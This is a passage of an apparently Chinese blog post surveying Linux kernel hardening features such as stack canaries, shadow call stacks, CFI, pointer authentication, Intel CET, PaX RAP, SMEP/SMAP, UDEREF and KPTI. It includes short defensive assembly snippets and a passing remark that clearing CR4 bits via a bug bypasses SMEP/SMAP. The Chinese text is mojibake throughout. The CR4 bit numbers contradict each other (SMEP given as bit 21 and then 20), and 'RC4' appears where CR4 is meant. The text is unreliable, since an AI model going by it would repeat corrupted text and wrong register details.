ˆç¼“å†²åŒºæº¢å‡ºçš„ä¿æŠ¤ï¼Œè¿™ä¸ªé€‰é¡¹å¼€å¯ä¹‹åä¼šäº§ç”Ÿå¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰çš„<code>canary</code>ï¼Œåœ¨å‡½æ•°å¼€å¤´éƒ¨åˆ†ä¸€ä¸ªå€¼ä¼šè¢«æ”¾è¿›æ ˆçš„è¿”å›åœ°å€ä¹‹å‰ã€‚å½“å‘æˆæ ˆæº¢å‡ºè¦†ç›–åˆ°<code>canary</code>ï¼Œåœ¨å‡½æ•°è¿”å›æ—¶ä¼šæ£€æŸ¥å…ˆå‰æ”¾å…¥çš„å€¼ï¼Œå¦‚æœä¸å‰é¢ç”Ÿæˆçš„å€¼ä¸åŒ¹é…åˆ™ä¼šç»ˆæ­¢ç¨‹åºã€‚<code>canary</code>äº§ç”Ÿçš„æ¡ä»¶æ˜¯æ ˆç©ºé—´å¤§äºç­‰äº8å­—èŠ‚ï¼Œéœ€è¦gcc 4.2ç‰ˆæœ¬ä»¥ä¸Šã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/STACKPROTECTOR.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/STACKPROTECTOR.html</a></p><h3 id="ARM-SHADOW-CALL-STACK"><a href="#ARM-SHADOW-CALL-STACK" class="headerlink" title="ARM: SHADOW_CALL_STACK"></a>ARM: SHADOW_CALL_STACK</h3><p>è¿™ä¸ªé€‰é¡¹ä¼šå¼€å¯Clangçš„å½±å­è°ƒç”¨æ ˆï¼Œå®ƒä¼šç”¨ä¸€ä¸ªå½±å­æ ˆæ¥ä¿å­˜å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™æ ·å³ä½¿æ”»å‡»è€…ä¿®æ”¹äº†è¿”å›åœ°å€ä¹Ÿæ— æ³•åŠ«æŒæ§åˆ¶æµï¼Œä½†å®ƒåªèƒ½ç”¨åœ¨Clangä½œä¸ºç¼–è¯‘è¯­è¨€çš„æƒ…å†µä¸‹ã€‚ç„¶è€Œå½“æ”»å‡»è€…çŸ¥é“å½±å­æ ˆçš„ä½ç½®ï¼Œå¹¶æ‹¥æœ‰å†™å…¥çš„æƒé™ï¼Œé‚£ä¹ˆè¿™ä¸ªé˜²æŠ¤å°†ä¼šå¤±æ•ˆã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/SHADOW_CALL_STACK.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/SHADOW_CALL_STACK.html</a></p><h3 id="Control-Flow-Integrity"><a href="#Control-Flow-Integrity" class="headerlink" title="Control Flow Integrity"></a>Control Flow Integrity</h3><p>ä¸ºäº†ç¼“è§£å„ç§æ§åˆ¶æµåŠ«æŒæ”»å‡»è€Œæå‡ºçš„ä¸€ç§é˜²å¾¡æ‰‹æ®µï¼Œåœ¨æœ€åŸå§‹çš„è®¾è®¡ä¸­æ˜¯é€šè¿‡åˆ†æç¨‹åºçš„æ§åˆ¶æµå›¾ï¼Œè·å–é—´æ¥è½¬ç§»æŒ‡ä»¤ï¼ˆåŒ…æ‹¬é—´æ¥è·³è½¬ã€é—´æ¥è°ƒç”¨ã€å’Œå‡½æ•°è¿”å›æŒ‡ä»¤ï¼‰ç›®æ ‡çš„ç™½åå•ï¼Œå¹¶åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ ¸å¯¹é—´æ¥è½¬ç§»æŒ‡ä»¤çš„ç›®æ ‡æ˜¯å¦åœ¨ç™½åå•ä¸­ã€‚ä½†è¿™ç§æ£€æŸ¥é’ˆå¯¹ç³»ç»Ÿä¸­çš„æ¯ä¸€ä¸ªè·³è½¬å’Œè°ƒç”¨å°±ä¼šé€ æˆæå¤§çš„ç³»ç»Ÿå¼€é”€ï¼Œè€Œç²—ç²’åº¦çš„æ£€æŸ¥åˆä¼šå¯¼è‡´å®‰å…¨æ€§çš„ä¸‹é™ã€‚æ‰€ä»¥ç°åœ¨çš„å®‰å…¨ç ”ç©¶å‘˜åœ¨æ¢ç´¢æ–°çš„CFIæŠ€æœ¯ï¼Œä½¿å…¶åœ¨å¯æ¥å—çš„å¼€é”€ä¸‹èƒ½è·å¾—é«˜å®‰å…¨æ€§ã€‚</p><h4 id="ARM-ARM64-PTR-AUTH-ARM64-BTI-KERNEL"><a href="#ARM-ARM64-PTR-AUTH-ARM64-BTI-KERNEL" class="headerlink" title="ARM: ARM64_PTR_AUTH + ARM64_BTI_KERNEL"></a>ARM: ARM64_PTR_AUTH + ARM64_BTI_KERNEL</h4><p><code>ARM64_PTR_AUTH</code>æ˜¯å¼€å¯æŒ‡é’ˆè®¤è¯æ”¯æŒçš„é€‰é¡¹ï¼Œå¼€å¯ä¹‹åä¼šæä¾›ç­¾åå’Œè®¤è¯æŒ‡é’ˆçš„æŒ‡ä»¤å¹¶äº§ç”Ÿç›¸å…³çš„å¯†é’¥ï¼Œè¿™äº›ä¿æŠ¤èƒ½é˜»æ­¢ROPç±»ä¿®æ”¹åœ°å€çš„æ”»å‡»ã€‚éœ€è¦ARMv8.3æ‰èƒ½æ”¯æŒçš„æ–°ç‰¹æ€§ã€‚</p><p><code>ARM64_BTI_KERNEL</code>å¼€å¯é€‰é¡¹ä¼šæŠŠåˆ†æ”¯ç›®æ ‡è¯†åˆ«ï¼ˆBTIï¼‰åº”ç”¨åˆ°å†…æ ¸ä¸­ï¼Œèƒ½å¤Ÿå¯¹é—´æ¥è·³è½¬çš„ç›®æ ‡è¿›è¡Œé™åˆ¶ï¼Œèƒ½é˜»æ­¢JOPç±»çš„è·³è½¬æ”»å‡»ã€‚ä¸æŒ‡é’ˆè®¤è¯ç»“åˆä½¿ç”¨èƒ½å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘æ§åˆ¶æµåŠ«æŒæ”»å‡»ã€‚éœ€è¦ARMv8.5æ‰èƒ½æ”¯æŒçš„æ–°ç‰¹æ€§ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/ARM64_PTR_AUTH.htmlï¼Œhttps://cateee.net/lkddb/web-lkddb/ARM64_BTI_KERNEL.htmlï¼Œhttps://www.secrss.com/articles/9812" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/ARM64_PTR_AUTH.htmlï¼Œhttps://cateee.net/lkddb/web-lkddb/ARM64_BTI_KERNEL.htmlï¼Œhttps://www.secrss.com/articles/9812</a></p><h4 id="X86-Intel-CET"><a href="#X86-Intel-CET" class="headerlink" title="X86: Intel CET"></a>X86: Intel CET</h4><p>Intelå¼€å‘çš„æ–°å®‰å…¨æœºåˆ¶æ§åˆ¶æµæ‰§è¡ŒæŠ€æœ¯CETï¼ˆControl-flow Enforcement Technologyï¼‰ï¼Œä¸»è¦æä¾›äº†ä¸¤ä¸ªåŠŸèƒ½ï¼Œé—´æ¥åˆ†æ”¯è·Ÿè¸ªå’Œå½±å­æ ˆã€‚é—´æ¥åˆ†æ”¯è·Ÿè¸ªèƒ½æä¾›å¯¹é—´æ¥åˆ†æ”¯çš„ä¿æŠ¤ï¼Œç”¨æ¥é˜²å¾¡<code>JOP/COP</code>ç±»çš„æ”»å‡»æ–¹æ³•ã€‚å½±å­æ ˆå¯ä»¥æä¾›å¯¹è¿”å›åœ°å€çš„ä¿æŠ¤ï¼Œç”¨æ¥é˜²å¾¡<code>ROP</code>ç±»çš„æ”»å‡»æ–¹æ³•ï¼Œå½±å­æ ˆçš„å®ç°æ–¹å¼å¤§å¤šç±»ä¼¼ï¼Œè¿™é‡ŒåŒæ ·æ˜¯ä¿å­˜è¿”å›åœ°å€ç„¶ååœ¨å‡½æ•°è¿”å›æ—¶å¯¹åœ°å€åšæ£€æŸ¥ã€‚</p><p>å‚è€ƒï¼š<a href="https://newsroom.intel.com/editorials/intel-cet-answers-call-protect-common-malware-threats/#gs.yeecux" target="_blank" rel="noopener">https://newsroom.intel.com/editorials/intel-cet-answers-call-protect-common-malware-threats/#gs.yeecux</a></p><h4 id="PAX-RAP"><a href="#PAX-RAP" class="headerlink" title="PAX_RAP"></a>PAX_RAP</h4><p>PaX/Grsecurityå›¢é˜Ÿåœ¨2015å¹´æå‡ºçš„é’ˆå¯¹Linuxå†…æ ¸çš„æ–°å®‰å…¨æœºåˆ¶ã€‚å…¶ä¸­çš„é˜²å¾¡æ€è·¯ä¹Ÿåˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸€ï¼Œé’ˆå¯¹è¿”å›åœ°å€çš„ä¿æŠ¤ï¼Œå®ƒå°†è¿”å›åœ°å€ä¿å­˜åœ¨<code>rbx</code>ä¸­å¹¶ä¸<code>r12</code>å¼‚æˆ–ï¼Œåœ¨å‡½æ•°è¿”å›ä¹‹å‰å†å¼‚æˆ–å›æ¥å¹¶ä¸è¿”å›åœ°å€ä½œæ¯”è¾ƒã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">push %rbx</span><br><span class="line">mov 8(%rsp),%rbx</span><br><span class="line">xor %r12,%rbx</span><br><span class="line">...</span><br><span class="line">xor %r12,%rbx</span><br><span class="line">cmp %rbx,8(%rsp)</span><br><span class="line">jnz .error</span><br><span class="line">pop %rbx</span><br><span class="line">retn</span><br><span class="line">.error:</span><br><span class="line">ud2</span><br></pre></td></tr></table></figure><p>å…¶äºŒï¼Œé’ˆå¯¹éç›´æ¥æ§åˆ¶è·³è½¬çš„ä¿æŠ¤ï¼Œå®ƒè¿™é‡Œä¼šåœ¨è°ƒç”¨ä¹‹å‰æ£€æŸ¥è°ƒç”¨åœ°å€æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œåœ¨è°ƒç”¨è¿”å›ä¹‹å‰ä¹Ÿä¼šè¿›è¡Œæ£€æŸ¥ã€‚</p><p>è°ƒç”¨æ‰§è¡Œä¹‹å‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmpq $0x11223344,-8(%rax)</span><br><span class="line">jne .error</span><br><span class="line">call *%rax</span><br><span class="line">...</span><br><span class="line">cmpq $0x55667788,-16(%rax)</span><br><span class="line">jne .error</span><br><span class="line">call *%rax</span><br><span class="line">...</span><br><span class="line">dq 0x55667788,0x11223344</span><br><span class="line">func:</span><br></pre></td></tr></table></figure><p>è°ƒç”¨è¿”å›ä¹‹å‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call ...</span><br><span class="line">jmp 1f</span><br><span class="line">dq 0xffffffffaabbccdd</span><br><span class="line">1:</span><br><span class="line">...</span><br><span class="line">mov %(rsp),%rcx</span><br><span class="line">cmpq $0xaabbccdd,2(%rcx)</span><br><span class="line">jne .error</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf" target="_blank" rel="noopener">https://pax.grsecurity.net/docs/PaXTeam-H2HC15-RAP-RIP-ROP.pdf</a></p><h3 id="SMEP-PXN"><a href="#SMEP-PXN" class="headerlink" title="SMEP/PXN"></a>SMEP/PXN</h3><p>åœ¨x86æ¶æ„ä¸‹ä¸ºSMEPï¼ˆSupervisor Mode Execution Preventionï¼Œç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨ARMæ¶æ„ä¸‹ä¸ºPXNï¼ˆPrivileged eXecute Neverï¼Œæ°¸ä¸æ‰§è¡Œæƒé™ï¼‰ã€‚</p><p>SMEPæ˜¯ç¦æ­¢å†…æ ¸æ‰§è¡Œç”¨æˆ·ç©ºé—´çš„ä»£ç ï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­æ‰§è¡Œäº†ç”¨æˆ·ç©ºé—´çš„ä»£ç å°±ä¼šè§¦å‘é¡µé”™è¯¯ã€‚å¼€å¯æ¡ä»¶æ˜¯<code>CR4</code>å¯„å­˜å™¨çš„ç¬¬21ä½ä¸º1ï¼Œå¦‚æœè¢«è®¾ç½®ä¸º0åˆ™ä¿æŠ¤å…³é—­ã€‚ï¼ˆè¿™ä¹Ÿç»™çªç ´ä¿æŠ¤ç•™ä¸‹äº†æœºä¼šï¼Œå¦‚æœèƒ½é€šè¿‡æ¼æ´æŠŠ<code>CR4</code>å¯„å­˜å™¨çš„ç¬¬20ä½è®¾ç½®ä¸º0å³å¯ç»•è¿‡ï¼‰</p><p>PXN æ˜¯ä¸€ä¸ªé˜²æ­¢ç”¨æˆ·ç©ºé—´ä»£ç è¢«å†…æ ¸ç©ºé—´æ‰§è¡Œçš„å®‰å…¨ç‰¹æ€§ï¼ˆå’ŒSMEPä¸€æ ·ï¼‰ã€‚åœ¨ ARMv7 çš„ç¡¬ä»¶æ”¯æŒä¸‹ï¼Œé€šè¿‡ PXN æ¯”ç‰¹ä½çš„è®¾å®šï¼Œå†³å®šè¯¥é¡µçš„å†…å­˜æ˜¯å¦å¯è¢«å†…æ ¸æ‰§è¡Œï¼Œå¯æœ‰æ•ˆé˜²æ­¢ ret2usr æ”»å‡»ã€‚éœ€è¦ARMv7çš„ç¡¬ä»¶æ”¯æŒã€‚</p><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PXN.mdï¼Œhttps://blog.csdn.net/qq_40827990/article/details/98937960" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PXN.mdï¼Œhttps://blog.csdn.net/qq_40827990/article/details/98937960</a></p><h3 id="SMAP-PAN"><a href="#SMAP-PAN" class="headerlink" title="SMAP/PAN"></a>SMAP/PAN</h3><p>åœ¨x86æ¶æ„ä¸‹ä¸ºSMAPï¼ˆSupervisor Mode Access Preventionï¼Œç®¡ç†æ¨¡å¼è®¿é—®ä¿æŠ¤ï¼‰ï¼Œåœ¨ARMæ¶æ„ä¸‹ä¸ºPANï¼ˆPrivileged Access Neverï¼Œæ°¸ä¸è®¿é—®æƒé™ï¼‰ã€‚</p><p>SMAPæ˜¯ç¦æ­¢å†…æ ¸è®¿é—®ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œå¦‚æœåœ¨å†…æ ¸ä¸­è®¿é—®äº†ç”¨æˆ·ç©ºé—´çš„ä»£ç å°±ä¼šå‡ºç°é”™è¯¯ã€‚å¼€å¯æ¡ä»¶æ˜¯<code>CR4</code>å¯„å­˜å™¨çš„ç¬¬22ä½ä¸º1ï¼Œå¦‚æœè¢«è®¾ç½®ä¸º0åˆ™ä¿æŠ¤å…³é—­ã€‚ç»•è¿‡çš„æ–¹å¼åŒæ ·å¯ä»¥æ˜¯åˆ©ç”¨æ¼æ´ä¿®æ”¹<code>RC4</code>å¯„å­˜å™¨çš„å€¼ã€‚</p><p>PANæ˜¯ä¸€ä¸ªé˜²æ­¢ç”¨æˆ·ç©ºé—´æ•°æ®è¢«å†…æ ¸ç©ºé—´è®¿é—®çš„å®‰å…¨ç‰¹æ€§ï¼ˆå’ŒSMAPä¸€æ ·ï¼‰ã€‚éœ€è¦ARMv8.1çš„ç¡¬ä»¶æ”¯æŒï¼Œä¸‹é¢æœ‰ä¸¤ä¸ªPANç›¸å…³çš„å†…æ ¸é…ç½®é€‰é¡¹ã€‚</p><p>å‚è€ƒï¼š<a href="https://mp.weixin.qq.com/s/ErugGvrJxhrf0qoxzWgQAQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ErugGvrJxhrf0qoxzWgQAQ</a></p><h4 id="ARM-CPU-SW-DOMAIN-PAN"><a href="#ARM-CPU-SW-DOMAIN-PAN" class="headerlink" title="ARM: CPU_SW_DOMAIN_PAN"></a>ARM: CPU_SW_DOMAIN_PAN</h4><p>é€‰é¡¹å¼€å¯ä¹‹åï¼Œå¯ç”¨CPUçš„PANä¿æŠ¤ï¼Œç¡®ä¿å†…æ ¸æ— æ³•è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®æ¥æé«˜å®‰å…¨æ€§ã€‚å®ç°æ€è·¯æ˜¯ç”¨ä¸åŒçš„å†…å­˜æ˜ å°„æ¥åšçº¦æŸï¼Œä½†é‡åˆ°å†…æ ¸ç¡®å®éœ€è¦è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®çš„æƒ…å†µæ—¶ï¼Œä¼šä¸´æ—¶å…³é—­ä¿æŠ¤ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/CPU_SW_DOMAIN_PAN.htmlï¼Œhttps://patchwork.kernel.org/project/linux-arm-kernel/patch/E1ZSmQG-0002za-E3@rmk-PC.arm.linux.org.uk/" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/CPU_SW_DOMAIN_PAN.htmlï¼Œhttps://patchwork.kernel.org/project/linux-arm-kernel/patch/E1ZSmQG-0002za-E3@rmk-PC.arm.linux.org.uk/</a></p><h4 id="ARM-ARM64-SW-TTBR0-PAN"><a href="#ARM-ARM64-SW-TTBR0-PAN" class="headerlink" title="ARM: ARM64_SW_TTBR0_PAN"></a>ARM: ARM64_SW_TTBR0_PAN</h4><p>è¿™ä¸ªé€‰é¡¹æ˜¯ç”¨<code>TTBR0_EL1</code>äº¤æ¢æ¥ä»¿çœŸå®ç°PANä¿æŠ¤ã€‚å¼€å¯é€‰é¡¹ä¹‹åé€šè¿‡æŠŠ<code>TTBR0_EL1</code>æŒ‡å‘ä¿ç•™å½’é›¶åŒºåŸŸå’Œä¿ç•™çš„ASIDæ¥é˜»æ­¢å†…æ ¸ç›´æ¥è®¿é—®ç”¨æˆ·ç©ºé—´æ•°æ®ã€‚å½“éœ€è¦è®¿é—®çš„æ—¶å€™ä¼šä¸´æ—¶æ¢å¤åˆæ³•çš„<code>TTBR0_EL1</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/ARM64_SW_TTBR0_PAN.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/ARM64_SW_TTBR0_PAN.html</a></p><h3 id="PAX-MEMORY-UDEREF"><a href="#PAX-MEMORY-UDEREF" class="headerlink" title="PAX_MEMORY_UDEREF"></a>PAX_MEMORY_UDEREF</h3><p>è¿™ä¸ªé˜²å¾¡æœºåˆ¶æ˜¯é’ˆå¯¹ Linux çš„å†…æ ¸/ç”¨æˆ·ç©ºé—´åšåœ°å€åˆ†ç¦»ï¼Œå†ç»“åˆ<code>KERNEXEC</code>èƒ½å¤Ÿé˜²å¾¡å¤§é‡é’ˆå¯¹å†…æ ¸çš„æ¼æ´åˆ©ç”¨ï¼Œæ¯”å¦‚<code>ret2usr/ret2dir</code>è¿™ç±»å°†ç‰¹æƒçº§æ‰§è¡Œæµå¼•å‘ç”¨æˆ·ç©ºé—´çš„æ”»å‡»æ–¹å¼ã€‚åœ¨ 32-bit çš„ x86 ä¸‹ï¼Œåˆ†ç¦»çš„ç‰¹æ€§å¾ˆå¤§éƒ¨åˆ†æ˜¯é€è¿‡åˆ†æ®µæœºåˆ¶çš„å¯„å­˜å™¨å»å®ç°çš„ï¼Œè€Œ amd64 ä»¥åç”±äºæ®µå¯„å­˜å™¨åŠŸèƒ½çš„å‰Šå¼±ï¼ŒPaX é’ˆå¯¹ 64-bit ç²¾å¿ƒè®¾è®¡äº†<code>KERNEXEC/UDEREF</code>ï¼ŒåŒ…æ‹¬ä½¿ç”¨ PCID ç‰¹æ€§å’Œ<code>per-cpu-pgd</code>çš„å®ç°ç­‰ã€‚åç»­UDEREFçš„æ”¹è¿›(2017ç‰ˆ)ä¸»è¦æ˜¯åˆ©ç”¨ç¡¬ä»¶ç‰¹æ€§SMAPæå‡äº†æ€§èƒ½çš„åŒæ—¶ä¿è¯å®‰å…¨æ€§ã€‚</p><p>UDEREFçš„å®ç°ä¸»è¦åŒ…æ‹¬å‡ ä¸ªæ–¹é¢ï¼š</p><ul><li><code>per-cpu-pgd</code> çš„å®ç°ï¼Œå°†å†…æ ¸/ç”¨æˆ·ç©ºé—´çš„é¡µç›®å½•å½»åº•åˆ†ç¦»ï¼Œå½¼æ­¤æ— æ³•è·¨ç•Œè®¿é—®</li><li>PCID ç‰¹æ€§çš„ä½¿ç”¨ï¼Œè·¨ç•Œè®¿é—®çš„æ—¶å€™äº§ç”Ÿç¡¬ä»¶æ£€æŸ¥</li><li>å†…æ ¸/ç”¨æˆ·ç©ºé—´åˆ‡æ¢æ—¶ï¼Œå°†ç”¨æˆ·ç©ºé—´æ˜ å°„ä¸ºä¸å¯æ‰§è¡Œä»¥åŠä¸€äº›åˆ·æ–° TLB é…åˆå®ç°</li></ul><p>ç”±äº UDEREF ç»è¿‡æ¼«é•¿çš„æ¼”å˜ï¼Œè€Œä¸”ä¸åŒçš„ç¡¬ä»¶è®¾æ–½ä¼šäº§ç”Ÿä¸åŒçš„é˜²å¾¡æ•ˆæœå’Œå®‰å…¨æ€§èƒ½ï¼Œå› æ­¤ PaX å®ç°äº†å¦‚ä¸‹å‡ ç§æ¨¡å¼çš„ UDEREFï¼š</p><ul><li>æ— ç¡¬ä»¶ PCID æ”¯æŒçš„ï¼Œç»´æŠ¤çš„é¡µç›®å½•æ•°é‡åªæœ‰ä¸€ä¸ªï¼Œè¿›å‡ºå†…æ ¸çš„æ—¶å€™å±è”½é¡µç›®å½•é¡¹çš„ç›¸å…³è®¿é—®æƒé™</li><li>æœ‰ç¡¬ä»¶ PCID æ”¯æŒçš„ WEAKUDEREFï¼Œç»´æŠ¤ä¸¤ä¸ªé¡µç›®å½•ï¼Œå¹¶ä¸”å°†ç”¨æˆ·ç©ºé—´ä¹Ÿå¤‡ä»½è¿›å†…æ ¸é¡µç›®å½•ï¼Œå±è”½ç›¸å…³è®¿é—®ä½ï¼Œè¿›å‡ºå†…æ ¸æ—¶åˆ‡æ¢ CR3</li><li>æœ‰ç¡¬ä»¶ PCID æ”¯æŒçš„ STRONGUDEREFï¼Œç»´æŠ¤ä¸¤ä¸ªé¡µç›®å½•ï¼Œä¸å¤‡ä»½ç”¨æˆ·ç©ºé—´ï¼Œå†…æ ¸ç©ºé—´çš„ TLB å¸¸é©»ä¸åˆ·æ–°ï¼Œå‡å°‘æ€§èƒ½æŸè€—</li></ul><p>å‚è€ƒï¼š<a href="https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_MEMORY_UDEREF.md" target="_blank" rel="noopener">https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_MEMORY_UDEREF.md</a></p><h3 id="DEFAULT-MMAP-MIN-ADDR-65536"><a href="#DEFAULT-MMAP-MIN-ADDR-65536" class="headerlink" title="DEFAULT_MMAP_MIN_ADDR=65536"></a>DEFAULT_MMAP_MIN_ADDR=65536</h3><p><code>MMAP_MIN_ADDR</code>æ˜¯å†…æ ¸ä¸­çš„ä¸€ä¸ªé…ç½®é€‰é¡¹ï¼Œå®ƒèƒ½æŒ‡å®šmmapäº§ç”Ÿçš„æœ€å°è™šæ‹Ÿåœ°å€ã€‚å¦‚æœè¿™ä¸ªå€¼è®¾ç½®è¿‡äºå°ä¼šå¢åŠ å†…æ ¸ç©ºæŒ‡é’ˆé—®é¢˜å¯¼è‡´çš„å®‰å…¨é£é™©ï¼Œå°åœ°å€ç©ºé—´ä¹Ÿå¯èƒ½é…åˆå…¶ä»–æ¼æ´åšè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚é˜»æ­¢ç¨‹åºæ˜ å°„è¾ƒä½è™šæ‹Ÿå†…å­˜åœ°å€ä¹Ÿæœ‰ä¸æ–¹ä¾¿çš„åœ°æ–¹ï¼Œæœ‰å°‘éƒ¨åˆ†åº”ç”¨ä¼šä¾èµ–æ˜ å°„ä½åœ°å€ï¼Œæ¯”å¦‚<code>dosemu</code>ï¼Œ<code>qemu</code>ï¼Œ<code>wine</code>ã€‚</p><p>å‚è€ƒï¼š<a href="https://wiki.debian.org/mmap_min_addr" target="_blank" rel="noopener">https://wiki.debian.org/mmap_min_addr</a></p><h3 id="X86-pti-on-PAGE-TABLE-ISOLATION"><a href="#X86-pti-on-PAGE-TABLE-ISOLATION" class="headerlink" title="X86: pti=on (PAGE_TABLE_ISOLATION)"></a>X86: pti=on (PAGE_TABLE_ISOLATION)</h3><p>å†…æ ¸é¡µè¡¨éš”ç¦»ï¼ˆKPTIï¼‰çš„å‰èº«ä¸ºKAISERï¼Œå®ƒæ˜¯åœ¨å…¶åŸºç¡€ä¸Šå¢åŠ å®ç°äº†å®Œå…¨åˆ†ç¦»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é¡µè¡¨æ¥è§£å†³é¡µè¡¨æ³„éœ²çš„é—®é¢˜ã€‚å®ç°ç»†èŠ‚ä¸Šï¼Œåœ¨åˆ›å»ºå…¨å±€é¡µç›®å½•ï¼ˆPGDï¼‰çš„æ—¶å€™ä¼šåˆ›å»ºä¸¤ä»½ï¼Œä¸€ä»½åœ¨å†…æ ¸è¿è¡Œæ—¶ä½¿ç”¨ï¼Œå¦å¤–ä¸€ä»½åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œæ—¶ä½¿ç”¨ï¼Œè¿™æ ·åœ¨åˆ‡æ¢å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´æ—¶PGDä¹Ÿä¼šåˆ‡æ¢ï¼Œè¿™ä¸¤ä¸ªPGDæœ‰ç€ç›¸åŒçš„ç»“æ„ï¼Œä½†å±äºç”¨æˆ·ç©ºé—´çš„PGDä¸­çš„å†…æ ¸ç©ºé—´å¤§éƒ¨åˆ†ä¼šç¼ºå¤±ã€‚</p><p>å‚è€ƒï¼š<a href="https://lwn.net/Articles/741878/" target="_blank" rel="noopener">https://lwn.net/Articles/741878/</a></p><h3 id="ARM-kpti-on-UNMAP-KERNEL-AT-EL0"><a href="#ARM-kpti-on-UNMAP-KERNEL-AT-EL0" class="headerlink" title="ARM: kpti=on (UNMAP_KERNEL_AT_EL0)"></a>ARM: kpti=on (UNMAP_KERNEL_AT_EL0)</h3><p>é€‰é¡¹å¼€å¯åå½“åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œæ—¶ä¼šå–æ¶ˆå†…æ ¸çš„æ˜ å°„ï¼Œè¿™ä¸ªä¿æŠ¤æ˜¯é’ˆå¯¹ä¹‹å‰çˆ†å‡ºçš„ç†”æ–­æ¼æ´ï¼Œå®ƒåˆ©ç”¨CPUçš„æ¨æµ‹è¡Œä¸ºç»•è¿‡MMUæƒé™æ£€æŸ¥ï¼Œæ³„éœ²å†…æ ¸æ•°æ®åˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚åœ¨å› ä¸ºç³»ç»Ÿè°ƒç”¨è§¦å‘ä¸­æ–­ç­‰ç­‰æƒ…å†µæ—¶åˆä¼šæŠŠå†…æ ¸æš‚æ—¶æ˜ å°„å›æ¥ã€‚</p><p>å‚è€ƒï¼š<a href="https://cateee.net/lkddb/web-lkddb/UNMAP_KERNEL_AT_EL0.html" target="_blank" rel="noopener">https://cateee.net/lkddb/web-lkddb/UNMAP_KERNEL_AT_EL0.html</a></p><h3 id="mitigations-auto-nosmt"><a href="#mitigations-auto-nosmt" class="headerlink" title="mitigations=auto,nosmt"></a>mitigations=auto,nosmt</h3><p>é€‰é¡¹æ§åˆ¶é’ˆå¯¹CPUçš„ä¿æŠ¤æªæ–½ï¼Œ<code>auto</code>ä¼šå¼€å¯æ‰€æœ‰çš„ä¿æŠ¤ï¼Œ<code>nosmt</code>ä¼šå…³é—­CPUçš„åŒæ­¥å¤šçº¿ç¨‹åŠŸèƒ½ã€‚è¿™æ ·æ¯ä¸ªCPUæ ¸çš„è¾…åŠ©CPUå°†ä¸ä¼šè¢«æ¿€æ´»ï¼Œå¹¶ä¸”åªä½¿ç”¨æ¯ä¸ªCPUæ ¸ä¸Šçš„ä¸»çº¿ç¨‹ã€‚</p><p>å‚è€ƒï¼š<a href="https://unix.stackexchange.com/questions/554908/disable-spectre-and-meltdown-mitigations" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/554908/disable-spectre-and-meltdown-mitigations</a></p><h3 id="X86-MICROCODE"><a href="#X86-MICROCODE" class="headerlink" title="X86: MICROCODE"></a>X86: MICROCODE</h3><p>Intelä¸ºäº†åº”å¯¹å¹½çµï¼Œé’ˆå¯¹MICROCODEçš„ç”Ÿæˆé—®é¢˜æ‰“ä¸Šè¡¥ä¸ã€‚åœ¨åŸæ¥çš„å¾®ç ROMä¸‹é¢åˆå¢åŠ äº†ä¸€å°å—SRAMå­˜å‚¨ï¼Œåˆ©ç”¨å®ƒæ¥åœ¨ROMä¸Šæ‰“è¡¥ä¸ã€‚è¡¥ä¸çš„è¿‡ç¨‹éœ€è¦å¾®ç è§£ç 